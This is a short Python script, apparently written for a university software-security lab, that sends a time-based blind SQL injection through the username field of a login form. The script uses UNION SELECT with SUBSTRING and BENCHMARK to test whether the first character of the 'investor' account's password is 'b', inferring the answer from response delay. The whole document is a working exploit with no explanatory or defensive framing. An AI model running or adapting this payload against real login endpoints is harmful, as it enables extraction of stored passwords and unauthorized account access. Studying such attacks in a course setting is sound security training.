import requests, time

Server = 'http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt'
session = requests.session()

#Default account: investor
query = "' UNION SELECT 1, 2, 3, 4, IF(SUBSTRING( password , 1, 1) = 'b', BENCHMARK(5000000, ENCODE('MSG', 'by 5 seconds')), null) FROM Users WHERE username= 'investor' -- "
password = "does not matter"

params = {'username' : query, 'password' : password }
start = time.time()
r = session.post(Server + '/login', data=params)
end = time.time()
total = end - start


if total >= 3:
    print("Delayed so first char is b")
else:
    print("Wrong char, try another")